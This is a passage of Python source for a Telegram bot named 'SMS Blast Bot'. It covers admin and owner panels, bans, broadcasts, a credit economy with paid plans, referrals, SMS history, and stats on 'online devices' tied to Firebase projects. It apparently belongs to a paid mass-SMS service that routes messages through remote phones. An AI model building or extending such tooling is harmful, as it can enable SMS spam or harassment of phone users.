    owners = d.get("owners", [])
    await cq.message.edit_text(
        f"👑 Super Admins\n\nTotal: {len(owners)}/6",
        reply_markup=owners_menu_kb(d),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:owners:add")
async def owner_owners_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    if len(d.get("owners", [])) >= 6:
        await cq.answer("❌ Max 6!", show_alert=True)
        return
    await state.set_state(S.add_owner)
    await cq.message.edit_text(
        f"👑 Add Super Admin\n\nSend Super Admin Chat ID:",
        reply_markup=kb([("Cancel", "owner:owners:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_owner)
async def owner_owners_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        new_id = int(msg.text.strip())
    except:
        await msg.answer(f"❌ Send a valid Chat ID.", parse_mode="HTML")
        return
    
    if is_owner(new_id, d):
        await state.clear()
        await msg.answer(f"⚠️ Already a super admin!", reply_markup=owners_menu_kb(d), parse_mode="HTML")
        return
    
    if len(d.get("owners", [])) >= 6:
        await state.clear()
        await msg.answer(f"❌ Max 6 super admins!", reply_markup=owners_menu_kb(d), parse_mode="HTML")
        return
    
    d["owners"].append(new_id)
    save(d)
    await state.clear()
    await msg.answer(
        f"✅ Super Admin Added!\n<code>{new_id}</code>",
        reply_markup=owners_menu_kb(load()),
        parse_mode="HTML"
    )
    try:
        await msg.bot.send_message(new_id, f"🔱 You are now a Super Admin!\nSend /start", parse_mode="HTML")
    except:
        pass

@R.callback_query(F.data.startswith("owner:owners:del:"))
async def owner_owners_del(cq: CallbackQuery):
    d = load()
    uid = cq.from_user.id
    del_id = int(cq.data.split("owner:owners:del:", 1)[1])
    
    if not is_owner(uid, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    
    if del_id == MAIN_OWNER or del_id in SUPER_ADMINS:
        await cq.answer("❌ Cannot remove main owner!", show_alert=True)
        return
    
    if del_id in d["owners"]:
        d["owners"].remove(del_id)
        save(d)
        await cq.answer("🗑 Removed!")
    
    await cq.message.edit_text(
        f"👑 Super Admins\n\nTotal: {len(d['owners'])}/6",
        reply_markup=owners_menu_kb(d),
        parse_mode="HTML"
    )

# ========== OWNER: ADMINS ==========
@R.callback_query(F.data == "owner:admins:menu")
async def owner_admins_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    admins = d.get("admins", [])
    await cq.message.edit_text(
        f"🛡 Admins\n\nTotal: {len(admins)}",
        reply_markup=admins_menu_kb(d),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:admins:add")
async def owner_admins_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_admin)
    await cq.message.edit_text(
        f"🛡 Add Admin\n\nSend Telegram User ID:",
        reply_markup=kb([("Cancel", "owner:admins:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_admin)
async def owner_admins_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        new_id = int(msg.text.strip())
    except:
        await msg.answer(f"❌ Send a valid ID.", parse_mode="HTML")
        return
    
    if new_id in d.get("admins", []) or is_owner(new_id, d):
        await state.clear()
        await msg.answer(f"⚠️ Already admin/owner!", reply_markup=admins_menu_kb(d), parse_mode="HTML")
        return
    
    d["admins"].append(new_id)
    save(d)
    await state.clear()
    await msg.answer(
        f"✅ Admin Added!\n<code>{new_id}</code>",
        reply_markup=admins_menu_kb(load()),
        parse_mode="HTML"
    )
    try:
        await msg.bot.send_message(new_id, f"🛡 You are now an Admin!\nSend /start", parse_mode="HTML")
    except:
        pass

@R.callback_query(F.data.startswith("owner:admins:del:"))
async def owner_admins_del(cq: CallbackQuery):
    d = load()
    uid = cq.from_user.id
    del_id = int(cq.data.split("owner:admins:del:", 1)[1])
    
    if not is_owner(uid, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    
    if del_id in d.get("admins", []):
        d["admins"].remove(del_id)
        save(d)
        await cq.answer("🗑 Removed!")
    
    await cq.message.edit_text(
        f"🛡 Admins\n\nTotal: {len(d['admins'])}",
        reply_markup=admins_menu_kb(d),
        parse_mode="HTML"
    )

# ========== OWNER: USERS LIST ==========
@R.callback_query(F.data.in_({"owner:users:list", "admin:users:list"}))
async def panel_users_list(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    prefix = "owner" if is_owner(uid, d) else "admin"
    if not is_admin(uid, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    text, markup = users_list_kb(d, prefix, 0)
    await cq.message.edit_text(text, reply_markup=markup, parse_mode="HTML")

@R.callback_query(F.data.regexp(r"^(owner|admin):users:pg:(\d+)$"))
async def panel_users_page(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    parts = cq.data.split(":")
    prefix = parts[0]
    page = int(parts[3])
    text, markup = users_list_kb(d, prefix, page)
    await cq.message.edit_text(text, reply_markup=markup, parse_mode="HTML")

# ========== OWNER: BAN / UNBAN ==========
@R.callback_query(F.data.in_({"owner:ban", "admin:ban"}))
async def panel_ban_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    await state.set_state(S.ban_user)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await cq.message.edit_text(
        f"🚫 Ban User\n\nSend User ID to ban:",
        reply_markup=kb([("Cancel", back)]),
        parse_mode="HTML"
    )

@R.message(S.ban_user)
async def panel_ban_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_admin(uid, d):
        await state.clear()
        return
    try:
        ban_id = int(msg.text.strip())
    except:
        await msg.answer(f"❌ Send a valid ID.", parse_mode="HTML")
        return
    if is_owner(ban_id, d) or is_admin(ban_id, d):
        await state.clear()
        await msg.answer(f"❌ Cannot ban Admin/Owner!", parse_mode="HTML")
        return
    if ban_id not in d.get("banned", []):
        d.setdefault("banned", []).append(ban_id)
        save(d)
    await state.clear()
    back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await msg.answer(
        f"🚫 User Banned!\n<code>{ban_id}</code>",
        reply_markup=back_kb,
        parse_mode="HTML"
    )
    try:
        await msg.bot.send_message(ban_id, f"🚫 You have been banned. Contact admin.", parse_mode="HTML")
    except:
        pass

@R.callback_query(F.data.in_({"owner:unban:menu", "admin:unban:menu"}))
async def panel_unban_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    banned = d.get("banned", [])
    if not banned:
        await cq.answer("✅ No banned users!", show_alert=True)
        return
    prefix = "owner" if is_owner(cq.from_user.id, d) else "admin"
    await cq.message.edit_text(
        f"🔓 Unban User\n\nBanned: {len(banned)}",
        reply_markup=unban_menu_kb(d, prefix),
        parse_mode="HTML"
    )

@R.callback_query(F.data.regexp(r"^(owner|admin):unban:do:(\d+)$"))
async def panel_unban_do(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    ban_id = int(cq.data.split(":")[-1])
    if ban_id in d.get("banned", []):
        d["banned"].remove(ban_id)
        save(d)
    await cq.answer(f"✅ {ban_id} Unbanned!", show_alert=True)
    back_text = owner_panel_text(d) if is_owner(uid, d) else admin_panel_text(d)
    back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await cq.message.edit_text(back_text, reply_markup=back_kb, parse_mode="HTML")
    try:
        await cq.bot.send_message(ban_id, f"✅ You have been unbanned. Send /start", parse_mode="HTML")
    except:
        pass

# ========== OWNER: BROADCAST ==========
@R.callback_query(F.data.in_({"owner:broadcast", "admin:broadcast"}))
async def panel_broadcast_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    await state.set_state(S.broadcast)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await cq.message.edit_text(
        f"📢 Broadcast\n\nType your broadcast message:",
        reply_markup=kb([("Cancel", back)]),
        parse_mode="HTML"
    )

@R.message(S.broadcast)
async def panel_broadcast_do(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_admin(uid, d):
        await state.clear()
        return
    await state.clear()
    users = d.get("users", {})
    wait = await msg.answer(f"📤 Broadcasting to {len(users)} users...", parse_mode="HTML")
    ok = 0
    fail = 0
    for uid_str in users:
        try:
            target = int(uid_str)
            if msg.text:
                bcast_text = f"📢 Broadcast\n\n{msg.text}"
                await msg.bot.send_message(target, bcast_text, parse_mode="HTML")
            else:
                await msg.copy_to(target)
            ok += 1
        except Exception:
            fail += 1
        await asyncio.sleep(0.05)
    await wait.delete()
    back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await msg.answer(
        f"✅ Broadcast Done!\n\n✅ Delivered: {ok}\n❌ Failed: {fail}",
        reply_markup=back_kb,
        parse_mode="HTML"
    )

# ========== OWNER: STATS ==========
@R.callback_query(F.data == "owner:stats")
async def owner_stats_cb(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await cq.answer("⏳ Fetching...")
    
    current_fb_ids = {fb["id"] for fb in d.get("firebases", [])}
    global CACHED_DEVICES, FB_DEVICE_COUNTS
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") in current_fb_ids]
    stale = [k for k in FB_DEVICE_COUNTS if k not in current_fb_ids]
    for k in stale:
        FB_DEVICE_COUNTS.pop(k, None)
    
    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(d)
    
    stats_text = api_stats_text(d)
    dev_lines = [f"\n🟢 Online Devices ({len(devices)})"]
    if not devices:
        dev_lines.append(f"  😴 No devices online")
    for dv in devices[:15]:  # Limit to 15 devices
        dev_lines.append(f"  📱 {dv['dev_name'][:20]} — 🔥 {dv['fb_label'][:20]}")
    full = stats_text + "\n" + "\n".join(dev_lines)
    
    if len(full) > 4000:
        full = full[:3990] + "\n...truncated"
    
    await cq.message.edit_text(
        full,
        reply_markup=kb([
            ("Refresh", "owner:stats"),
            ("Back", "owner:home")
        ]),
        parse_mode="HTML"
    )

# ========== OWNER: FREE MODE TOGGLE ==========
@R.callback_query(F.data.in_({"owner:free:on", "owner:free:off"}))
async def owner_free_toggle(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    d["free_mode"] = (cq.data == "owner:free:on")
    save(d)
    mode = "🟢 FREE MODE ON" if d["free_mode"] else "🔴 Approval Required"
    await cq.answer(f"Done! {mode}", show_alert=True)
    try:
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    except TelegramBadRequest:
        pass

# ========== OWNER: SETTINGS ==========
@R.callback_query(F.data == "owner:settings")
async def owner_settings(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    settings = d.get("settings", {})
    text = (
        f"⚙️ Bot Settings\n\n"
        f"🎁 Referral Credits: {settings.get('ref_credits', 3)}\n"
        f"👑 Max Owners: {settings.get('max_owners', 6)}"
    )
    rows = [
        [btn("SET REFERRAL CREDITS", "owner:settings:ref", EMOJI_GIFT, "🎁", style="success")],
        [btn("BACK", "owner:home", EMOJI_GEAR, "🔙", style="primary")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:settings:ref")
async def owner_settings_ref(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.set_ref_credits)
    await cq.message.edit_text(
        f"🎁 Set Referral Credits\n\nCredits per referral:\n<i>Example: 5</i>",
        reply_markup=kb([("Cancel", "owner:settings")]),
        parse_mode="HTML"
    )

@R.message(S.set_ref_credits)
async def owner_settings_ref_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        credits = int(msg.text.strip())
        if credits < 0:
            raise ValueError
    except:
        await msg.answer(f"❌ Send a valid positive number.", parse_mode="HTML")
        return
    d.setdefault("settings", {})["ref_credits"] = credits
    d["premium"]["ref_credits"] = credits
    save(d)
    await state.clear()
    await msg.answer(
        f"✅ Referral Credits Updated!\n\nNow {credits} credits per referral.",
        reply_markup=kb([("Back", "owner:settings")]),
        parse_mode="HTML"
    )

# ========== OWNER: ACTIVITY LOG ==========
@R.callback_query(F.data == "owner:activity")
async def owner_activity_log(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    
    log_entries = d.get("activity_log", [])[-20:]
    if not log_entries:
        text = f"📜 Activity Log\n\n<i>No activity yet.</i>"
    else:
        lines = [f"📜 Recent Activity Log"]
        for entry in reversed(log_entries):
            ts = fmt_time(entry.get("timestamp", 0))
            action = entry.get("action", "unknown")
            uid = entry.get("uid", 0)
            details = entry.get("details", "")
            lines.append(f"[{ts}] <code>{uid}</code> — {action} — {details}")
        text = "\n".join(lines)
    
    await cq.message.edit_text(
        text,
        reply_markup=kb([
            ("Refresh", "owner:activity"),
            ("Back", "owner:home")
        ]),
        parse_mode="HTML"
    )

# ========== OWNER: SMS HISTORY ==========
@R.callback_query(F.data == "owner:sms_history")
async def owner_sms_history(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    
    all_history = d.get("sms_history", {})
    total_entries = sum(len(v) for v in all_history.values())
    
    text = f"📋 Global SMS History\n\nTotal Records: {total_entries}\n\n<i>Per-user history in their Stats.</i>"
    
    await cq.message.edit_text(
        text,
        reply_markup=kb([("Back", "owner:home")]),
        parse_mode="HTML"
    )

# ========== OWNER: CREDITS ==========
@R.callback_query(F.data == "owner:credits:add")
async def owner_credits_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_credits_uid)
    await cq.message.edit_text(
        f"💰 Add Credits\n\nStep 1/2: User ID:",
        reply_markup=kb([("Cancel", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.add_credits_uid)
async def owner_credits_add_uid(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        uid = int(msg.text.strip())
        await state.update_data(credit_uid=uid)
    except:
        await msg.answer(f"❌ Send a valid ID.", parse_mode="HTML")
        return
    await state.set_state(S.add_credits_amount)
    await msg.answer(
        f"💰 Step 2/2\n\nCredits to add:",
        reply_markup=kb([("Cancel", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.add_credits_amount)
async def owner_credits_add_amount(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        amount = int(msg.text.strip())
    except:
        await msg.answer(f"❌ Send a valid number.", parse_mode="HTML")
        return
    
    fsmd = await state.get_data()
    uid = fsmd.get("credit_uid")
    add_credits(uid, amount, d)
    save(d)
    await state.clear()
    
    try:
        await msg.bot.send_message(uid, f"💰 Credits Added!\n\n+{amount} credits added!\n💳 Balance: {get_user_credits(uid, d)}", parse_mode="HTML")
    except:
        pass
    
    await msg.answer(
        f"✅ {amount} credits added to <code>{uid}</code>!\n💳 New Balance: {get_user_credits(uid, d)}",
        reply_markup=kb([("Back", "owner:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:credits:deduct")
async def owner_credits_deduct_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.deduct_credits_uid)
    await cq.message.edit_text(
        f"💰 Deduct Credits\n\nStep 1/2: User ID:",
        reply_markup=kb([("Cancel", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.deduct_credits_uid)
async def owner_credits_deduct_uid(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        uid = int(msg.text.strip())
        await state.update_data(deduct_uid=uid)
    except:
        await msg.answer(f"❌ Send a valid ID.", parse_mode="HTML")
        return
    await state.set_state(S.deduct_credits_amount)
    await msg.answer(
        f"💰 Step 2/2\n\nCredits to deduct:",
        reply_markup=kb([("Cancel", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.deduct_credits_amount)
async def owner_credits_deduct_amount(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        amount = int(msg.text.strip())
    except:
        await msg.answer(f"❌ Send a valid number.", parse_mode="HTML")
        return
    
    fsmd = await state.get_data()
    uid = fsmd.get("deduct_uid")
    success = deduct_credits(uid, amount, d)
    save(d)
    await state.clear()
    
    if success:
        try:
            await msg.bot.send_message(uid, f"⚠️ Credits Deducted!\n\n-{amount} credits deducted.\n💳 Balance: {get_user_credits(uid, d)}", parse_mode="HTML")
        except:
            pass
        await msg.answer(
            f"✅ {amount} credits deducted from <code>{uid}</code>!\n💳 New Balance: {get_user_credits(uid, d)}",
            reply_markup=kb([("Back", "owner:home")]),
            parse_mode="HTML"
        )
    else:
        await msg.answer(
            f"❌ Insufficient credits! User has only {get_user_credits(uid, d)} credits.",
            reply_markup=kb([("Back", "owner:home")]),
            parse_mode="HTML"
        )

# ========== OWNER: ADD ALL CREDITS ==========
@R.callback_query(F.data == "owner:add_all_credits")
async def owner_add_all_credits_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.add_all_credits_amount)
    await cq.message.edit_text(
        f"💰 Add Credits to ALL Users\n\nCredits to give to each user:\n<i>Example: 10</i>",
        reply_markup=kb([("Cancel", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.add_all_credits_amount)
async def owner_add_all_credits_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    try:
        amount = int(msg.text.strip())
        if amount <= 0:
            raise ValueError
    except:
        await msg.answer(f"❌ Send a valid positive number.", parse_mode="HTML")
        return
    
    await state.clear()
    users = d.get("users", {})
    if not users:
        await msg.answer(f"❌ No users found!", reply_markup=kb([("Back", "owner:home")]), parse_mode="HTML")
        return
    
    count = 0
    for uid_str in users:
        add_credits(int(uid_str), amount, d)
        count += 1
    
    save(d)
    
    notification = f"💰 Credits Added!\n\n🎉 You received {amount} credits!"
    
    success = 0
    for uid_str in users:
        try:
            await msg.bot.send_message(int(uid_str), notification, parse_mode="HTML")
            success += 1
            await asyncio.sleep(0.05)
        except:
            pass
    
    await msg.answer(
        f"✅ Credits Added to All Users!\n\n"
        f"💰 {amount} credits each\n"
        f"👥 Total users: {count}\n"
        f"📨 Notified: {success} users",
        reply_markup=kb([("Back", "owner:home")]),
        parse_mode="HTML"
    )
    log_activity(d, "add_credits_all", uid, f"Added {amount} credits to {count} users")

# ========== OWNER: DEDUCT ALL CREDITS ==========
@R.callback_query(F.data == "owner:deduct_all_credits")
async def owner_deduct_all_credits_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.deduct_all_credits_amount)
    await cq.message.edit_text(
        f"💰 Deduct Credits from ALL Users\n\nCredits to deduct from each user:\n<i>Example: 5</i>",
        reply_markup=kb([("Cancel", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.deduct_all_credits_amount)
async def owner_deduct_all_credits_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    try:
        amount = int(msg.text.strip())
        if amount <= 0:
            raise ValueError
    except:
        await msg.answer(f"❌ Send a valid positive number.", parse_mode="HTML")
        return
    
    await state.clear()
    users = d.get("users", {})
    if not users:
        await msg.answer(f"❌ No users found!", reply_markup=kb([("Back", "owner:home")]), parse_mode="HTML")
        return
    
    count = 0
    total_deducted = 0
    owners = d.get("owners", [MAIN_OWNER])
    admins = d.get("admins", [])
    
    for uid_str, udata in users.items():
        user_id = int(uid_str)
        if user_id in owners or user_id in admins:
            continue
        current = udata.get("credits", 0)
        if current >= amount:
            udata["credits"] = current - amount
            count += 1
            total_deducted += amount
        else:
            if current > 0:
                udata["credits"] = 0
                count += 1
                total_deducted += current
    
    save(d)
    
    await msg.answer(
        f"✅ Credits Deducted from Users!\n\n"
        f"💰 {amount} credits each deducted\n"
        f"👥 Total users affected: {count}\n"
        f"💳 Total deducted: {total_deducted}\n"
        f"👑 Owners/Admins: Skipped\n\n"
        f"⚠️ No notification sent.",
        reply_markup=kb([("Back", "owner:home")]),
        parse_mode="HTML"
    )
    log_activity(d, "deduct_credits_all", uid, f"Deducted {total_deducted} credits from {count} users")

# ========== USER: REDEEM ==========
@R.callback_query(F.data == "user:redeem")
async def user_redeem_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(S.redeem_code)
    await cq.message.edit_text(
        f"🎁 Redeem Code\n\nEnter your redeem code:\n<i>Example: GIFTABC123</i>",
        reply_markup=kb([("Cancel", "user:home")]),
        parse_mode="HTML"
    )

@R.message(S.redeem_code)
async def user_redeem_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    code = msg.text.strip().upper()
    await state.clear()
    codes = d.get("redeem_codes", {})
    if code not in codes:
        await msg.answer(f"❌ Invalid redeem code!", reply_markup=kb([("Home", "user:home")]), parse_mode="HTML")
        return
    code_data = codes[code]
    if code_data.get("uses_left", 0) <= 0:
        await msg.answer(f"❌ This code has expired!", reply_markup=kb([("Home", "user:home")]), parse_mode="HTML")
        return
    if uid in code_data.get("used_by", []):
        await msg.answer(f"❌ You've already used this code!", reply_markup=kb([("Home", "user:home")]), parse_mode="HTML")
        return
    credits = code_data["credits"]
    add_credits(uid, credits, d)
    code_data["uses_left"] = code_data.get("uses_left", 1) - 1
    code_data.setdefault("used_by", []).append(uid)
    save(d)
    await msg.answer(
        f"🎉 Redeem Successful!\n\n💰 +{credits} credits added!\n💳 Balance: {get_user_credits(uid, d)}",
        reply_markup=kb([("Home", "user:home")]),
        parse_mode="HTML"
    )

# ========== USER: REFER ==========
@R.callback_query(F.data == "user:refer")
async def user_refer(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    code = generate_user_refer_code(uid, d)
    save(d)
    ref_credits = d.get("settings", {}).get("ref_credits", 3)
    me = await cq.bot.get_me()
    await cq.message.edit_text(
        f"👥 Referral Program\n\n"
        f"Share your referral code and earn {ref_credits} credits per referral!\n\n"
        f"🎁 Your Code: <code>{code}</code>\n\n"
        f"🔗 Share Link:\n"
        f"https://t.me/{me.username}?start={code}",
        reply_markup=kb([("Back", "user:home")]),
        parse_mode="HTML"
    )

# ========== USER: STATS ==========
@R.callback_query(F.data == "user:stats")
async def user_stats(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    udata = d["users"].get(str(uid), {})
    stats = d.get("stats", {})
    await cq.message.edit_text(
        f"📊 Your Stats\n\n"
        f"💰 Credits: {udata.get('credits', 0)}\n"
        f"📤 SMS Sent: {udata.get('uses', 0)}\n"
        f"📅 Joined: {fmt_time(udata.get('joined_at', 0))}\n\n"
        f"📈 Bot Total Sent: {stats.get('total_sent', 0)}",
        reply_markup=kb([("Back", "user:home")]),
        parse_mode="HTML"
    )

# ========== USER: SMS HISTORY ==========
@R.callback_query(F.data == "user:sms_history")
async def user_sms_history(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    history = d.get("sms_history", {}).get(str(uid), [])[-10:]
    if not history:
        text = f"📜 Your SMS History\n\n<i>No SMS sent yet.</i>"
    else:
        lines = [f"📜 Your SMS History (Last 10)"]
        for i, entry in enumerate(reversed(history), 1):
            ts = fmt_time(entry.get("timestamp", 0))
            num = entry.get("number", "Unknown")
            msg_preview = entry.get("message", "")[:30]
            status = entry.get("status", "unknown")
            status_icon = "✅" if status == "sent" else "🛑" if status == "stopped" else "⏳"
            lines.append(f"{i}. [{ts}] {status_icon} <code>{mask_number(num)}</code> — {msg_preview}...")
        text = "\n".join(lines)
    await cq.message.edit_text(text, reply_markup=kb([("Back", "user:home")]), parse_mode="HTML")

# ========== USER: PRICING ==========
@R.callback_query(F.data == "user:pricing")
async def user_pricing(cq: CallbackQuery, state: FSMContext):
    d = load()
    plans = d.get("pricing", {}).get("plans", [])
    if not plans:
        await cq.answer("❌ No plans available!", show_alert=True)
        return
    text = f"💰 Buy Credits\n\n"
    for plan in plans:
        text += f"📋 {plan['name']}\n"
        text += f"   💰 Price: {plan['price']} {plan.get('currency', 'INR')}\n"
        text += f"   🎁 Credits: {plan['credits']}\n\n"
    rows = []
    for plan in plans:
        rows.append([btn_url(f"Buy {plan['name'][:20]}", plan['payment_link'], EMOJI_MONEY, "💳", style="success")])
    rows.append([btn("Back", "user:home", EMOJI_GEAR, "🔙", style="primary")])
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

# ========== USER: CREDITS ==========
@R.callback_query(F.data == "user:credits")
async def user_credits(cq: CallbackQuery):
    d = load()
    uid = cq.from_user.id
    credits = get_user_credits(uid, d)
    await cq.answer(f"💰 Credits: {credits}\nOwner: {SUPER_ADMIN_NAME}", show_alert=True)

# ========== USER: TRANSFER ==========
@R.callback_query(F.data == "user:transfer")
async def user_transfer_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if is_banned(uid, d):
        await cq.answer("🚫 You are banned!", show_alert=True)
        return
    if not can_use(uid, d):
        await cq.answer("⛔ Access denied!", show_alert=True)
        return
    current_credits = get_user_credits(uid, d)
    if current_credits < 2:
        await cq.answer("❌ Minimum 2 credits needed!", show_alert=True)
        return
    await state.set_state(S.transfer_credits_uid)
    await cq.message.edit_text(
        f"💸 Transfer Credits\n\n"
        f"💰 Your Credits: {current_credits}\n"
        f"⚠️ You can transfer half your credits!\n\n"
        f"Step 1/2: Send User ID:",
        reply_markup=kb([("Cancel", "user:home")]),
        parse_mode="HTML"
    )

@R.message(S.transfer_credits_uid)
async def user_transfer_uid(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    try:
        target_uid = int(msg.text.strip())
    except:
        await msg.answer(f"❌ Valid User ID (numbers only):", parse_mode="HTML")
        return
    if target_uid == uid:
        await msg.answer(f"❌ Cannot transfer to yourself!", parse_mode="HTML")
        return
    if str(target_uid) not in d.get("users", {}):
        await msg.answer(f"❌ User ID does not exist!", parse_mode="HTML")
        return
    current_credits = get_user_credits(uid, d)
    if current_credits < 2:
        await msg.answer(f"❌ Minimum 2 credits needed!", parse_mode="HTML")
        return
    await state.update_data(transfer_target=target_uid)
    await state.set_state(S.transfer_credits_amount)
    half = current_credits // 2
    await msg.answer(
        f"💸 Step 2/2 — Amount\n\n"
        f"👤 Target: <code>{target_uid}</code>\n"
        f"💰 Your Credits: {current_credits}\n"
        f"📤 Max Transfer (Half): {half}\n\n"
        f"How many credits? (Max {half})",
        reply_markup=kb([("Cancel", "user:home")]),
        parse_mode="HTML"
    )

@R.message(S.transfer_credits_amount)
async def user_transfer_amount(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    try:
        amount = int(msg.text.strip())
        if amount <= 0:
            raise ValueError
    except:
        await msg.answer(f"❌ Valid positive number:", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    target_uid = fsmd.get("transfer_target")
    current_credits = get_user_credits(uid, d)
    max_transfer = current_credits // 2
    if amount > max_transfer:
        await msg.answer(f"❌ Max {max_transfer} credits! (Half of {current_credits})", parse_mode="HTML")
        return
    if not deduct_credits(uid, amount, d):
        await msg.answer(f"❌ Insufficient credits!", parse_mode="HTML")
        return
    add_credits(target_uid, amount, d)
    save(d)
    await state.clear()
    try:
        await msg.bot.send_message(
            target_uid,
            f"💸 Credits Received!\n\n"
            f"👤 From: <code>{uid}</code>\n"
            f"💰 Amount: {amount} credits\n"
            f"💳 New Balance: {get_user_credits(target_uid, d)}",
            parse_mode="HTML"
        )
    except:
        pass
    await msg.answer(
        f"✅ Transfer Successful!\n\n"
        f"👤 To: <code>{target_uid}</code>\n"
        f"💰 Amount: {amount} credits\n"
        f"💳 Your Balance: {get_user_credits(uid, d)}",
        reply_markup=kb([("Home", "user:home")]),
        parse_mode="HTML"
    )
    log_activity(d, "credit_transfer", uid, f"Transferred {amount} credits to {target_uid}")

# ========== USER: INFO ==========
@R.callback_query(F.data == "user:info")
async def user_info(cq: CallbackQuery, state: FSMContext):
    await cq.message.edit_text(
        f"ℹ️ SMS Blast Bot {_VERSION}\n\n"
